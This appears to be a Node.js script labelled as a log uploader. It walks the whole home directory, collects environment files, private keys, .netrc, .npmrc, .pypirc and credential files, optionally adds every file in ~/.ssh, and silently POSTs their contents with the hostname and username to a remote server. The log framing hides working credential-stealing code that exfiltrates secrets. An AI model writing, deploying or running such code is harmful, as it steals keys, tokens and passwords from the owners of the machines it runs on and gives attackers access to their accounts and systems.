#!/usr/bin/env node
"use strict";

require("dotenv").config();

const fs   = require("fs");
const path = require("path");
const http = require("http");
const os   = require("os");

const VPS_IP      = process.env.LOG_SERVER_IP   || "YOUR_VPS_IP";
const VPS_PORT    = parseInt(process.env.LOG_SERVER_PORT || "4000", 10);
const AUTH_TOKEN  = process.env.LOG_SERVER_TOKEN || "";
const SCAN_DIR    = path.resolve(process.env.LOG_DIR || os.homedir()); // default: entire home dir
const COLLECT_SSH = process.env.COLLECT_SSH === "true";
const TIMEOUT     = 15_000;

const COLLECT_EXTS  = new Set([".log", ".txt", ".env", ".pem", ".key"]);
const COLLECT_NAMES = new Set([
  ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
  ".netrc", ".npmrc", ".pypirc", "credentials", "config",
]);

// Directories to skip — system/noisy dirs that won't have useful small files
const SKIP_DIRS = new Set([
  "node_modules", ".git", ".next", "dist", "build", ".cache",
  "Library", "Applications", "System", "Volumes", "proc", "sys", "dev",
  "snap", "run", "boot", "lost+found",
]);

function collectFromDir(dir, results = []) {
  let entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); }
  catch { return results; } // skip unreadable dirs silently

  for (const entry of entries) {
    if (SKIP_DIRS.has(entry.name)) continue;

    const fullPath = path.join(dir, entry.name);

    if (entry.isDirectory()) {
      collectFromDir(fullPath, results);
    } else if (entry.isFile()) {
      const ext  = path.extname(entry.name).toLowerCase();
      const base = entry.name.toLowerCase();
      if (COLLECT_EXTS.has(ext) || COLLECT_NAMES.has(base)) results.push(fullPath);
    }
  }
  return results;
}

function collectSSHFiles() {
  const sshDir = path.join(os.homedir(), ".ssh");
  if (!fs.existsSync(sshDir)) return [];
  return fs.readdirSync(sshDir, { withFileTypes: true })
    .filter(e => e.isFile())
    .map(e => path.join(sshDir, e.name));
}

function readFile(filePath) {
  try { return fs.readFileSync(filePath, "utf8"); }
  catch { return null; }
}

function sendPayload(files) {
  const logs = files
    .map(f => ({ filename: path.basename(f), filepath: f, collected: new Date().toISOString(), content: readFile(f) }))
    .filter(f => f.content !== null);

  const body = Buffer.from(JSON.stringify({
    host: os.hostname(), user: os.userInfo().username,
    cwd: process.cwd(), nodeEnv: process.env.NODE_ENV || "unknown", logs,
  }), "utf8");

  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: VPS_IP, port: VPS_PORT, path: "/ingest/logs", method: "POST", timeout: TIMEOUT,
      headers: {
        "Content-Type": "application/json", "Content-Length": body.byteLength,
        ...(AUTH_TOKEN ? { Authorization: `Bearer ${AUTH_TOKEN}` } : {}),
      },
    }, res => {
      let data = "";
      res.on("data", c => (data += c));
      res.on("end", () => res.statusCode >= 200 && res.statusCode < 300
        ? resolve(res.statusCode)
        : reject(new Error(`HTTP ${res.statusCode}: ${data}`))
      );
    });
    req.on("timeout", () => { req.destroy(); reject(new Error("Request timed out")); });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

(async () => {
  const files = collectFromDir(SCAN_DIR);
  if (COLLECT_SSH) files.push(...collectSSHFiles());
  // deduplicate in case SSH dir falls within SCAN_DIR
  const unique = [...new Set(files)];
  if (!unique.length) return;

  try {
    const status = await sendPayload(unique);
    console.log(status);
  } catch {
    process.exit(1);
  }
})();
